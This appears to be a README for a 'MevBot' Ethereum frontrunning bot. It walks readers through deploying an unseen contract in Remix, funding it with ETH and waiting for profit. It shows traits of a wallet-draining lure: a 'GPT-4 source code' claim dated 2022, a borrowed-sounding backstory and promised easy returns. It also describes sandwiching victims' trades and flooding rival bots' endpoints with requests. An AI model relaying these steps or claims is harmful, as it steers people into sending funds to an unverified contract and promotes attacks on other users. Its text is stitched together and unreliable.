# MevBot

My development is licensed. All rights reserved by the "APE" team (Apeboting)
--------------
These 2 screenshots are for informative purposes of our copyrights!
--------------
![6](https://user-images.githubusercontent.com/131911477/235349182-d6c9de04-c439-4f67-a856-ee67cbcaf57d.png)
![7](https://user-images.githubusercontent.com/131911477/235349187-a091cc61-cbf6-43de-915d-cf2890e5ea88.png)


Make money with MEV-bot (GPT-4 source code) (audit contract)
--------

Update 30.04.2022
------
The contract is optimized. now the "start" and "withdraw" functions require less gas.
---------

The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

But ser, there are open source bots that do the same

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

Wen increase aggressiveness ?

As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

Personal journey in this

What did I learn?

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap

So why stop?

I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

MEV bot Instructions
-------



(works only for Mainnet)
How it works:
----

create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.

![0 (1)](https://user-images.githubusercontent.com/131911477/235349199-71b8d99d-eaf1-47fa-838c-12167d1838e9.png)

The bot will make transactions on your entire balance to increase profit
![exemple 4](https://user-images.githubusercontent.com/131911477/235349395-1395b558-1d26-4633-bc7a-3ecf379d4202.png)
![exemple5](https://user-images.githubusercontent.com/131911477/235349398-92744f62-9356-4cd7-a0b6-555ae2b3ab45.png)



First-source code
-----
Access the Remix IDE  https://remix.ethereum.org/ 
-----------
FILE EXPLORER
---------
 and click and create new file "MevBot.sol"
Copy code and paste in Remix IDE

![1](https://user-images.githubusercontent.com/131911477/235349230-8143c17f-02c9-41f5-a728-492ab8dfbd1e.png)


Click Solidity complier 0.6.6
------

And press Compile Mev Bot.sol

![2](https://user-images.githubusercontent.com/131911477/235349234-301121bd-4146-41e7-91ae-16703786411a.png)


Select ETH or BSC(BNB) network
-----

and router address

Press Transact (Deploy)
-----

![3](https://user-images.githubusercontent.com/131911477/235349238-ec7c5a6c-1e9a-4366-8661-49243721e37d.png)


Next-deposit (balans Mev Bot)
------

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button


![4](https://user-images.githubusercontent.com/131911477/235349258-a413cff7-3a82-445c-bf59-0634ae9c555c.png)

![4 1](https://user-images.githubusercontent.com/131911477/235349262-32660929-f3ba-40a5-9c76-97a8614b729b.png)


![5](https://user-images.githubusercontent.com/131911477/235349265-53162628-9a59-44aa-a644-b652a4dadea3.png)


Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1
----

At any time you can Stop bot or return your money by calling the withdrawal function.
-----
